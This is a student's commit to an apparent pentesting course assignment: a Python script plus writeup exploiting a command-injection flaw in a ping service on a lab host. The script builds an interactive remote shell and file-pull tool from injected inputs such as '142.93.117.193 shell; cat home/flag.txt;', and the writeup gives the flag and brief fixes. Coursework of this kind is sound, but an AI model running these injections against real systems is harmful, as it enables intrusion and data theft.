5007b22e8091150e286a0b3710e7a877d08b549d
vincedgm <vince.012999@gmail.com>
2018-09-29 20:52:29 -0400

    completed assignment 4

--- week/4/stub.py
+++ week/4/stub.py
@@ -8,6 +8,7 @@
 """
 
 import socket
+import os
 
 host = "cornerstoneairlines.co" # IP address here
 port = 45 # Port here
@@ -30,8 +31,50 @@ def execute_cmd(cmd):
 
                 s.send("something to send\n")   # Send a newline \n at the end of your command
     """
-    print("IMPLEMENT ME")
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
+        
+    data = s.recv(1024)
+    #print(data)
 
+    s.send(cmd + "\n")
+
+    data = s.recv(1024)
+    return data
 
 if __name__ == '__main__':
-    print("IMPLEMENT ME")
+    dir = ''
+    while True:
+        cmd = raw_input('> ').split(" ")
+        if cmd[0] == 'shell':
+            while True:
+                if dir == '':
+                    cur_dir = execute_cmd("142.93.117.193 shell; pwd;").split()
+                else:
+                    cur_dir = execute_cmd("142.93.117.193 shell; cd "+dir+"; pwd;").split()
+                s = raw_input(cur_dir[0] + '> ').split(" ")
+
+                if s[0] == 'exit':
+                    break
+
+                if s[0] == 'cd':
+                    dir = s[1]
+                else:
+                    if dir == '':
+                        print(execute_cmd("142.93.117.193 shell; " + ' '.join(s) + ";"))
+                    else:
+                        print(execute_cmd("142.93.117.193 shell; cd " + cur_dir[0] + "; " + ' '.join(s) + ";"))
+        elif cmd[0] == 'pull':
+            remote = cmd[1]
+            local = cmd[2]
+
+            execute_cmd("142.93.117.193 shell; scp krueger@cornerstoneairlines.co:" +remote+" " + local)
+        elif cmd[0] == 'help':
+            print("1. shell - Drop into an interactive shell and allow user to exit\n2. pull <remote-path> <local-path> - Download files\n3. help - Shows help menu\n4. quit - Quits Shell")
+        elif cmd[0] == 'quit':
+            break
+        else:
+            print("Error malformed input\n")
+            print("1. shell - Drop into an interactive shell and allow user to exit\n2. pull <remote-path> <local-path> - Download files\n3. help - Shows help menu\n4. quit - Quits Shell")
+        
+
--- week/4/writeup/README.md
+++ week/4/writeup/README.md
@@ -1,17 +1,17 @@
 Writeup 3 - Pentesting I
 ======
 
-Name: *PUT YOUR NAME HERE*
-Section: *PUT YOUR SECTION HERE*
+Name: Vince De Guzman
+Section: 0201
 
 I pledge on my honor that I havie not given or received any unauthorized assistance on this assignment or examination.
 
-Digital acknowledgement of honor pledge: *PUT YOUR NAME HERE*
+Digital acknowledgement of honor pledge: Vince De Guzman
 
 ## Assignment 4 Writeup
 
 ### Part 1 (45 pts)
-*Put your writeup >= 300 words here in response to the part 1 prompt*
+Using the command given I saw that I was able to enter an IP Address and that it was vulnerable to a command injection attack. The very first input I did was to enter the IP Address (142.93.117.193) followed by shell; to see if it was working correctly. After making sure that it worked, I used the same input but afterwards I put ls to look at the different directories. From there I cd into the home directory and checked to see what files were in there. After finding the flag.txt file my final input was 142.93.117.193 shell; cat home/flag.txt; and the flag I found was CMSC389R-{p1ng_as_a_$erv1c3}. Some precautions that Fred could implement would to utilize an actual web-based OSINT solution instead of utilization a Linux ping command. Fred could also utilize existing API for the website.
 
 ### Part 2 (55 pts)
-*Put your writeup >= 200 words here in response to part 2 prompt. Your code for part 2 should be copied into a file in the /writeup directory and pushed there as well*
+My implementation was to have a while loop that takes in the different commands. Inputing shell starts a while loop that will repeatedly execute commands and utilize command injection attack. I take in the current directory and the command written on the command line and use execute_cmd to send attack to the IP address. To implement the pull command I used execute_cmd to cd to the remote-path given and from there I used mv to copy it to the local path given. Help and Quit are self explanatory where I just break the loop and help prints the help menu.
